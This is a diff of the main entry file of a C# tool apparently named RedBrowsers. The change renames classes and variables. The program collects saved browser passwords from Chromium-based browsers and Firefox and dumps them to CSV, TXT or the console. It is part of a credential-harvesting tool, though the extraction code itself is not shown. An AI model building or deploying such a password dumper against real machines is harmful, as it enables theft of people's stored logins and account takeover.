@@ -1,20 +1,19 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using RedBrowsers.Classes;
+using RedBrowsers.Utlis;
 using static RedBrowsers.Utlis.Utlis;
+
 namespace RedBrowsers
 {
      static class Program
     {
         static void Main(string[] args)
         {
-            List<Account> a = ChromiumEngine.GetChromium.Grab();
-            a.AddRange(Firfox.FirefoxPassReader.ReadPasswords());
-
+            List<ExtractedCredentials> Credentials = ChromiumEngine.ChromiumStorage.ReadPasswords();
+            Credentials.AddRange(Firefox.FirefoxStorage.ReadPasswords());
             if (!(args.Length == 0))
             {
-
                 switch (args[0].ToUpper())
                 {
                     case "CSV":
@@ -22,7 +21,7 @@ namespace RedBrowsers
 
                             try
                             {
-                                CreateCSV(a, args[1]);
+                                CreateCSV(Credentials, args[1]);
                             }
                             catch (Exception ex)
                             {
@@ -30,31 +29,24 @@ namespace RedBrowsers
                             }
                             break;
                         }
-
                     case "TXT":
                         {
                             try
                             {
-                                File.WriteAllText(args[1], CreateString(a));
+                                File.WriteAllText(args[1], CreateString(Credentials));
                             }
                             catch (Exception ex)
                             {
                                 Console.WriteLine(ex.Message);
                             }
-
                             break;
                         }
-
                 }
-
             }
             else 
             {
-                Console.WriteLine(CreateString(a));
-
+                Console.WriteLine(CreateString(Credentials));
             }
-            Console.ReadLine();
-
         }
 
     }
